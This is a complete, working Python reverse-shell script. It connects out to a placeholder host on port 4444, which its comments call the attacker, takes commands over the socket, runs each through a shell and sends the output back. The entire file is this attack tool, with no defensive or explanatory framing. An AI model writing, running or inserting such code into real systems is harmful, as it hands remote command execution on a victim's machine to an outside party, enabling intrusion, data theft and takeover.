import socket
import subprocess
import os

# Setting up connection
target_ip = "IP_OF_TARGET"  
target_port = 4444  # enter desired port

# Create a socket to connect back to the attacker
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# command execution
while True:
    # Receive command from attacker
    command = s.recv(1024)
    if command.decode("utf-8").lower() == "exit":
        break
    # Execute the command and send the output back to the attacker
    output = subprocess.run(command.decode("utf-8"), shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

# Close the connection
s.close()
